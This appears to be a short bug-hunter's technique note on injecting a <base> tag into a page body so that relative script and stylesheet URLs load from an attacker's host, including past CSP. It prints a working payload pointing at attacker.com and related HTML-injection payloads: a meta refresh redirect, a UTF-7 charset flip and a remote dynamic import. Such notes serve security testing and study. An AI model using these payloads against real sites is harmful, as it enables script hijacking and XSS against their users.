---
title: <base> tag in body — relative URL hijack
slug: base-tag-anywhere
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/dom-xss, technique/csp-bypass]
inbound: []
---

# Base tag anywhere

## Pattern
`<base href="//attacker">` rewrites all relative URLs in the document.
Spec says head-only; tested live: Chrome and Safari honor it inside
`<body>`.

Useful for hijacking JS imports / nonce-allowed external scripts in
CSP scenarios where target loads `<script src="/app.js">` (relative).

## Preconditions
- HTML injection sink in `<body>` that allows `<base>`.
- Target page loads at least one critical resource via relative URL.

## Triggering
```html
<base href="//attacker.com/">
<!-- All subsequent <script src="/foo.js">, <link href="/bar.css"> etc.
     load from attacker.com -->
```

## Related (HTML-injection-only XSS escalations, Eps 52 + 26)
- Meta-tag injection: `<meta http-equiv="refresh" content="0;url=//attacker">`
  no-JS redirect.
- Meta CSP tightening: `<meta http-equiv="Content-Security-Policy" ...>`.
- Meta charset flip: `<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">`.
- `<image>` rewrites to `<img>`.
- Dynamic `import("https://x/x.js")` works in plain browser JS — short
  payload.

## Seen in the wild
- Critical Thinking Podcast Eps 26, 52.

## References
- Critical Thinking Podcast Eps 26, 52
- HTML5 spec — base element
